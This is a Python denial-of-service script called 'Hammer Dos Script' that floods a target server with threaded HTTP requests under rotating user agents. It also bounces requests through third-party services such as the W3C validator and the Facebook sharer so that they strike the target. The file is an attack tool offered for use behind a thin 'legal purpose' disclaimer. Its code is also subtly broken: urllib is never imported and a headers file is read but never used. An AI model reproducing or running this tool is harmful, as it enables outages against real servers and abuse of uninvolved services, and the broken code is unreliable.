#!/usr/bin/python3
# -*- coding: utf-8 -*-

# python 3.3.2+ Hammer Dos Script v.1
# by Scav-engeR
# only for legal purpose

# Import necessary modules
from queue import Queue
from optparse import OptionParser
import time, sys, socket, threading, random
import logging  # Import the logging module

# Define the user agents
def user_agent():
    global uagent
    uagent = [
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
    ]
    return uagent

# Define the bot URLs
def my_bots():
    global bots
    bots = [
        "http://validator.w3.org/check?uri=",
        "http://www.facebook.com/sharer/sharer.php?u="
    ]
    return bots

# Define usage instructions
def usage():
    print(''' \033[92m    Hammer Dos Script v.1 http://www.canyalcin.com/
    It is the end user's responsibility to obey all applicable laws.
    It is just for server testing script. Your ip is visible. \n
    usage : python3 hammer.py [-s] [-p] [-t]
    -h : help
    -s : server ip
    -p : port default 80
    -t : turbo default 135 \033[0m''')
    sys.exit()

# Get command line parameters
def get_parameters():
    global host, port, thr
    optp = OptionParser(add_help_option=False, epilog="Hammers")
    optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel", const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
    optp.add_option("-t", "--turbo", type="int", dest="turbo", help="default 135 -t 135")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.turbo is None:
        thr = 135
    else:
        thr = opts.turbo

# Define the dos() method
def dos():
    # This method sends HTTP requests to the target server.
    iterations = 10  # Number of iterations to run (adjust as needed)
    for _ in range(iterations):
        item = q.get()
        req = urllib.request.urlopen(urllib.request.Request(f"http://{host}", headers={'User-Agent': random.choice(uagent)}))
        print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--packet sent! hammering--> \033[0m")
        time.sleep(0.1)
        q.task_done()

# Define the dos2() method
def dos2():
    # This method sends HTTP requests to random bot URLs.
    iterations = 20  # Number of iterations to run (adjust as needed)
    for _ in range(iterations):
        item = w.get()
        req = urllib.request.urlopen(urllib.request.Request(random.choice(bots) + f"http://{host}", headers={'User-Agent': random.choice(uagent)}))
        print("\033[94mbot is hammering...\033[0m")
        time.sleep(0.1)
        w.task_done()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        usage()
    get_parameters()
    print("\033[92m", host, " port: ", str(port), " turbo: ", str(thr), "\033[0m")
    print("\033[94mPlease wait...\033[0m")
    user_agent()
    my_bots()
    # Initialize task queues
    q = Queue()
    w = Queue()
    # Read headers from file
    headers = open("headers.txt", "r")
    data = headers.read()
    headers.close()
    # Start threads for dos() and dos2() methods
    for _ in range(thr):
        t = threading.Thread(target=dos)
        t.daemon = True
        t.start()
        t2 = threading.Thread(target=dos2)
        t2.daemon = True
        t2.start()
    # Add tasks to the task queues
    for item in range(1800):  # Limiting to avoid memory crash
        q.put(item)
        w.put(item)
    # Wait for all tasks to be completed
    q.join()
    w.join()
